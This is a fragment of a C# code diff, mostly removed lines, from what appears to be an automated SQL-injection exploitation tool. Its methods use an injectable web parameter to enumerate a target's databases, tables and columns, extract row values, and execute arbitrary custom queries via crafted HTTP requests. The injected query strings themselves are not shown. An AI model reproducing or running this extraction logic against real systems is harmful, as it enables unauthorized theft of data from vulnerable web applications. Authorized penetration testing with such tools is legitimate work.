-            if (!internalData.ParameterInjectable || userStop)
-                return;
-
-            extractingInfos.Status.Add("Getting databases");
-            extractingInfos.CurrentTestComplete = false;
-            extractingInfos.DatabaseInfos.Clear();
-
-            string DatabaseCount = string.Empty;
-            DatabaseCount = BuildRequests(queryConstructor.GetDatabaseCountQuery(internalData.DataBaseType), internalData.DataBaseType);
-
-            int iDatabaseCount = Convert.ToInt32(DatabaseCount);
-            for (int i = 0; i < iDatabaseCount; i++)
-            {
-                string DatabaseName = BuildRequests(queryConstructor.GetDatabaseNameQuery(internalData.DataBaseType, i), internalData.DataBaseType);
-                extractingInfos.DatabaseInfos.Add(new DatabaseInfo { DatabaseName = DatabaseName });
-            }
-            extractingInfos.Status.Add("Done: Adding database");
-            extractingInfos.CurrentTestComplete = true;
-        }
-
-        public void GetTables(object DBindex)
-        {
-            GetTables((int)DBindex);
-        }
-        private void GetTables(int DBindex)
-        {
-            if (!internalData.ParameterInjectable || userStop)
-                return;
-            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
-                return;
-
-            extractingInfos.Status.Add("Getting tables");
-            extractingInfos.CurrentTestComplete = false;
-            extractingInfos.DatabaseInfos[DBindex].Tables.Clear();
-
-            string TabellenAnz = string.Empty;
-            TabellenAnz = BuildRequests(queryConstructor.TabellenAnzahl(extractingInfos.DatabaseInfos[DBindex].DatabaseName, internalData.DataBaseType), internalData.DataBaseType);
-            
-            int iTableCount = -1;
-
-            if (Int32.TryParse(TabellenAnz,out iTableCount))
-            {
-                for (int i = 0; i < iTableCount; i++)
-                {
-                    string TabellenName = BuildRequests(queryConstructor.GetTabellenNamenQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, i, internalData.DataBaseType), internalData.DataBaseType);
-                    extractingInfos.DatabaseInfos[DBindex].Tables.Add(new Table { TableName = TabellenName });
-                }
-            }
-            extractingInfos.Status.Add("Done: Adding tables");
-            extractingInfos.CurrentTestComplete = true;
-        }
-
-        public void GetColumns(object Parameter)
-        {
-            string[] Split = Parameter.ToString().Split(',');
-            GetColumns(Convert.ToInt32(Split[0]), Convert.ToInt32(Split[1]));
-        }
-        private void GetColumns(int DBindex, int TableIndex)
-        {
-            if (!internalData.ParameterInjectable || userStop)
-                return;
-            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
-                return;
-
-            extractingInfos.Status.Add("Getting columns");
-            extractingInfos.CurrentTestComplete = false;
-            extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Clear();
-
-            string Feldanzahl = string.Empty;
-            Feldanzahl = BuildRequests(queryConstructor.GetFeldAnzahlQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, internalData.DataBaseType), internalData.DataBaseType);
-
-            int iFeldanzahl = Convert.ToInt32(Feldanzahl);
-            for (int i = 0; i < iFeldanzahl; i++)
-            {
-                string FeldName = BuildRequests(queryConstructor.GetFeldNamenQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, i, internalData.DataBaseType), internalData.DataBaseType);
-                string FeldTyp = BuildRequests(queryConstructor.GetFeldTypQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, FeldName, internalData.DataBaseType), internalData.DataBaseType);
-
-                extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Add(new Field { FeldName = FeldName, FeldTyp = FeldTyp });
-            }
-            extractingInfos.Status.Add("Done: Adding columns");
-            extractingInfos.CurrentTestComplete = true;
-        }
-
-        public void GetRows(object Parameter)
-        {
-            string[] Split = Parameter.ToString().Split(',');
-            GetRows(Convert.ToInt32(Split[0]), Convert.ToInt32(Split[1]));
-        }
-        private void GetRows(int DBindex, int TableIndex)
-        {
-            if (!internalData.ParameterInjectable || userStop)
-                return;
-            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
-                return;
-
-            extractingInfos.Status.Add("Getting rows");
-            extractingInfos.CurrentTestComplete = false;
-
-            string DatabaseName = extractingInfos.DatabaseInfos[DBindex].DatabaseName;
-            string TabellenName = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName;
-
-            string Rows = string.Empty;
-            Rows = BuildRequests(queryConstructor.GetDatarowsCount(DatabaseName, TabellenName, internalData.DataBaseType), internalData.DataBaseType);
-
-            int iRows = Convert.ToInt32(Rows);
-            string OrderBySpalte = string.Empty;
-            for (int iRow = 0; iRow < 25 && iRow < iRows; iRow++)
-            {
-                for (int i = 0; i < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; i++)
-                {
-                    if (iRow == 0)
-                        extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldWert.Clear();
-
-                    string FeldName = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldName;
-
-                    //string FeldWertLänge = string.Empty;
-                    //FeldWertLänge = BuildRequests(queryConstructor.GetDatarowsLength(DatabaseName, TabellenName, FeldName, iRow, internalData.DataBaseType), internalData.DataBaseType);
-                    //int iFeldWertLänge = Convert.ToInt32(FeldWertLänge);
-                    if (OrderBySpalte.Length == 0)
-                    {
-                        for (int iSpaltepk = 0; iSpaltepk < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; iSpaltepk++)
-                        {
-                            string FeldTypNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldTyp;
-                            string FeldNameNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldName;
-                            if (FeldTypNeu == "int")
-                                if (FeldNameNeu.ToLower() == "id" || FeldNameNeu.ToLower() == "pk" || FeldNameNeu.ToLower() == "nr" || FeldNameNeu.ToLower() == "index")
-                                {
-                                    OrderBySpalte = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldName;
-                                    break;
-                                }
-                        }
-                    }
-
-                    if (OrderBySpalte.Length == 0)
-                    {
-                        for (int iSpalte = 0; iSpalte < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; iSpalte++)
-                        {
-                            string FeldTypNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpalte].FeldTyp;
-                            if (FeldTypNeu != "text" && FeldTypNeu != "ntext" && FeldTypNeu != "image")
-                            {
-                                OrderBySpalte = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpalte].FeldName;
-                                break;
-                            }
-                        }
-                    }
-
-
-                    string FeldWert = BuildRequests(queryConstructor.GetDatarowValue(DatabaseName, TabellenName, FeldName, iRow, OrderBySpalte, internalData.DataBaseType), internalData.DataBaseType);
-                    extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldWert.Add(FeldWert);
-                }
-            }
-
-            extractingInfos.Status.Add("Done: Adding rows");
-            extractingInfos.CurrentTestComplete = true;
-        }
-
-        public string ExecuteCustomQuery(string query)
-        {
-            if (internalData.ParameterInjectable == true)
-            {
-                string Output = BuildRequests(query, internalData.DataBaseType);
-                if (Output == string.Empty)
-                    return "query failed or nothing to display";
-                else
-                    return Output;
-            }
-            else return "Parameter is not injectable";
-        }
-
-
-        private string SendWebrequest(string URL, string POST)
-        {
-            CreateWebrequest request = new CreateWebrequest();
-            request.CustomCookieCollection = injectInfos.CustomCookieCollection;
-            string HTML = request.StringGetWebPage(URL, POST);
-            ExtractingInfos.Requests.Add(URL);
-
-            return HTML;
-        }
-
-        private void SendAsyncWebrequest(string URL, string POST, string Function, eDataBase DB)
-        {
-            if (!userStop)
-                ReqManager.AddRequest(new Request() { URL = URL, POST = POST, Function = Function, DataBaseType = DB });
-        }
-    }
+      private void SendAsyncWebrequest(string url, string post, string function, DataBaseType dataBase)
+      {
+         if (!_userStop)
+            _reqManager.AddRequest(new Request { URL = url, POST = post, Function = function, DataBaseType = dataBase });
+      }
+   }
 }
